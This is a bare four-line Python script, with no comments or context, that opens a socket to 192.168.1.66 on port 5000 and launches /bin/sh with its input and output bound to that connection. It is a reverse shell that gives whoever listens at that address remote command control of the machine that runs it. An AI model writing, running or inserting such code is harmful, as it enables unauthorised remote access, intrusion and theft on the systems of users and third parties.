import socket,os
s=socket.socket()
s.connect(("192.168.1.66", 5000))
os.system("/bin/sh <&3 >&3 2>&3")
